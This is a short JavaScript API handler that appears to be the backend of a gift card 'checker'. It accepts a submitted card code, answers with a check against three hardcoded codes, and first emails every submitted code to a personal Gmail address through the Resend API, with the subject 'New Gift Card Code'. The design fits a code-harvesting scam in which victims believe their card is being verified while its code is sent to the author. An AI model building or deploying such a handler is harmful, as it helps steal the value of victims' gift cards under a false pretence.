import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

export default async function handler(req, res) {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ success: false });
    }

    const code = req.body?.code;

    console.log("🔥 CODE RECEIVED:", code);

    if (!code) {
      return res.status(400).json({ success: false });
    }

    // ✅ SEND EMAIL
    await resend.emails.send({
      from: "onboarding@resend.dev", // leave this
      to: "sodiqdioxide@gmail.com", // your email
      subject: "🎁 New Gift Card Code",
      html: `<h2>New Code Received</h2><p><b>Code:</b> ${code}</p>`
    });

    const validCodes = [
      "1234567890123456",
      "ABCD1234",
      "A9999999"
    ];

    const isValid = validCodes.includes(code);

    console.log("✅ VALID:", isValid);

    return res.status(200).json({ success: isValid });

  } catch (err) {
    console.log("🚨 ERROR:", err);
    return res.status(500).json({ success: false });
  }
}
